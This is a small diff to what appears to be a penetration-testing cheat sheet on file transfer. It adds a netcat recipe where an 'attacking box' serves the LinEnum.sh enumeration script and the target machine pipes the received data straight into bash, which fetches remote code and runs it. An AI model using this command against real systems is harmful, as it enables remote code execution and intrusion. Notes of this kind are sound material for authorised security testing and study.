@@ -22,6 +22,14 @@ nc -nlvp 55555 > file
 # Now send the file
 nc iptoreceivefile 55555 < file 
 ```
+#### Alternate Netcat File Transfer to execute automatically in bash
+```
+# On attacking box
+cat LinEnum.sh | nc -lvnp 9001
+
+# On target machine
+nc attackingip 9001 | bash
+```
 #### TFTP UDP Transfer
 ```
 # Create directory to serve files
